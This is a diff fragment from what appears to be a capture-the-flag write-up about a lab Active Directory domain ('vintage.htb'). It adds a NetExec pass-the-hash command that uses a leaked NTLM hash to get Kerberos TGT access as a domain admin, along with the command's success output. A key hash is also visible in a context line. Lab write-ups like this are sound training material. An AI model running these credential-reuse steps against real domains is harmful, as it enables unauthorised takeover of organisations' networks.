@@ -520,5 +520,14 @@ FS01$:des-cbc-md5:dafb3738389e205b
 
 ## Auth as the Domain admin
 ```python
+nxc smb dc01.vintage.htb -u L.Bianchi_adm -H '6b751449807e0d73065b0423b64687f0' -k --generate-tgt administraotr
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\L.Bianchi_adm:6b751449807e0d73065b0423b64687f0 (Pwn3d!)
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: administraotr.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=administraotr.ccache
+```
+Ive now generated a TGT for the domain admin since the `Administrator` account did not work
+
+```python
 
 ```
